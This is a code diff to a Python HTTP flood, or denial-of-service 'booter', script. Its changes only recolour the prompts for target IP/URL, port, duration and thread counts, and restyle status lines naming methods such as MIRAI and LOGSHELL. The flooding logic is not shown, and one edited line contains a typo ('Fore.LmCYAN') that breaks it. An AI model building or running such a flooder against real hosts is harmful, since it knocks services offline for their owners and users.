@@ -24,9 +24,9 @@ def clear_text():
         os.system('clear')
 
 def status_print(ip,port,thread_id,rps,path_get):
-    print(f"{Fore.YELLOW}HTTP {Fore.LIGHTWHITE_EX}Flood {Fore.WHITE}=> {Fore.BLUE}TARGET{Fore.WHITE}={ip}:{port} {Fore.LIGHTBLUE_EX}PATH{Fore.WHITE}={path_get}") 
-    print(f"{Fore.BLUE}HTTP {Fore.LIGHTGREEN_EX}Flood {Fore.WHITE}=> {Fore.YELLOW}TARGET{Fore.WHITE}={ip}:{port} {Fore.CYAN}RPS{Fore.WHITE}={rps}") 
-    print(f"{Fore.WHITE}HTTP {Fore.LIGHTYELLOW_EX}Flood {Fore.WHITE}=> {Fore.CYAN}TARGET{Fore.WHITE}={ip}:{port}{Fore.LIGHTCYAN_EX}ID{Fore.WHITE}={thread_id}{Fore.RESET}")
+    print(f"\r{Fore.YELLOW}HTTP {Fore.LIGHTWHITE_EX}Flood {Fore.WHITE}=> {Fore.BLUE}TARGET{Fore.WHITE}={ip}:{port} {Fore.LIGHTBLUE_EX}PATH{Fore.WHITE}={path_get}") 
+    print(f"\r{Fore.BLUE}HTTP {Fore.LIGHTGREEN_EX}Flood {Fore.WHITE}=> {Fore.YELLOW}TARGET{Fore.WHITE}={ip}:{port} {Fore.CYAN}RPS{Fore.WHITE}={rps}") 
+    print(f"\r{Fore.WHITE}HTTP {Fore.LIGHTYELLOW_EX}Flood {Fore.WHITE}=> {Fore.CYAN}TARGET{Fore.WHITE}={ip}:{port}{Fore.LIGHTCYAN_EX}ID{Fore.WHITE}={thread_id}{Fore.RESET}")
 def generate_url_path_pyflooder(num):
     msg = str(string.ascii_letters + string.digits + string.punctuation)
     data = "".join(random.sample(msg, int(num)))
@@ -101,15 +101,15 @@ print(banner)
 host = ""
 ip = ""
 print(f"{Fore.LIGHTYELLOW_EX}╭─────────────────")
-target_loader = input(f"{Fore.LIGHTYELLOW_EX}╰─> IP/URL: ")
-port_loader = int(input(f"{Fore.LIGHTYELLOW_EX}╰─> PORT: "))
-time_loader = time.time() + int(input(f"{Fore.LIGHTCYAN_EX}╰─> TIME(DF250): "))
-spam_loader = int(input(f"{Fore.LIGHTCYAN_EX}╰─> SP THREAD(DF50/250): "))
-create_thread = int(input(F"{Fore.LIGHTCYAN_EX}╰─> CR THREAD (DF=50): "))
-booter_sent = int(input(F"{Fore.LIGHTCYAN_EX}╰─> BOOTER SENT (DF500): "))
-print(f"{Fore.LIGHTCYAN_EX}       EXAMPLE HTTP METHODS> CONNECT GET POST {Fore.BLACK}PUT PATCH HEAD DELETE OPTIONS TRACE")
+target_loader = input(f"{Fore.CYAN}╰─> IP/URL:{Fore.BLUE} ")
+port_loader = int(input(f"{Fore.CYAN}╰─> PORT:{Fore.BLUE} "))
+time_loader = time.time() + int(input(f"{Fore.CYAN}╰─> TIME(DF250):{Fore.BLUE} "))
+spam_loader = int(input(f"{Fore.CYAN}╰─> SP THREAD(DF50/250):{Fore.BLUE} "))
+create_thread = int(input(F"{Fore.LmCYAN}╰─> CR THREAD (DF=50):{Fore.BLUE} "))
+booter_sent = int(input(F"{Fore.CYAN}╰─> BOOTER SENT (DF500):{Fore.BLUE} "))
+print(f"{Fore.CYAN}       EXAMPLE HTTP METHODS> CONNECT GET POST {Fore.BLACK}PUT PATCH HEAD DELETE OPTIONS TRACE")
 print(f"{Fore.CYAN}EXAMPLE CUSTOM HTTP METHODS> {Fore.BLACK}PANOS MIRAI EXPLOIT LOGSHELL SERVER CLOUDFLARE AGE PYFLOODER GATEWAY")
-methods_loader = input(F"{Fore.LIGHTCYAN_EX}╰─>HTTP_METHODS: ")
+methods_loader = input(F"{Fore.LIGHTCYAN_EX}╰─>HTTP_METHODS:{Fore.BLUE} ")
 print(f"{Fore.MAGENTA}TRYING TO GET IP:PORT {Fore.LIGHTMAGENTA_EX}. . .{Fore.RESET}")
 try:
     host = str(target_loader).replace("https://", "").replace("http://", "").replace("www.", "").replace("/", "")
@@ -127,4 +127,4 @@ for loader_num in range(create_thread):
 clear_text()
 print(banner)
 status_code = True
-print(f"{Fore.GREEN}Trying sent . . .{Fore.RESET}")
+print(f"{Fore.GREEN}TRYING SENT . . .{Fore.RESET}")
